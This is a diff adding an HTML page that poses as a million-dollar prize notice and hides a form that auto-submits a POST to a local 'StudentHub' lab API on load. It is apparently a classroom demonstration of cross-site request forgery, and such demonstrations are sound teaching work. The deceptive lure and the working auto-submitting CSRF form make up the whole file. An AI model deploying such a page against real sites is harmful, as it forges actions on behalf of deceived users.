@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Win a Prize!</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; background: #f0f0f0; }
+        .win { color: #d9534f; font-size: 48px; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="win">YOU WON $1,000,000!</div>
+    <p>Click the button below to claim your prize.</p>
+    <button onclick="alert('Verification failed. Try again.')">CLAIM PRIZE</button>
+
+    <!-- HIDDEN CSRF ATTACK -->
+    <!-- This form will automatically submit to the StudentHub API when the page loads -->
+    <form id="hackerForm" action="http://localhost:5000/api/lab/change-status" method="POST" style="display:none;">
+        <input type="hidden" name="newStatus" value="HACKED_BY_CSRF">
+    </form>
+
+    <script>
+        // Automatically submit the form without the user's knowledge
+        window.onload = function() {
+            document.getElementById('hackerForm').submit();
+            console.log("CSRF Attack launched in the background...");
+        };
+    </script>
+</body>
+</html>
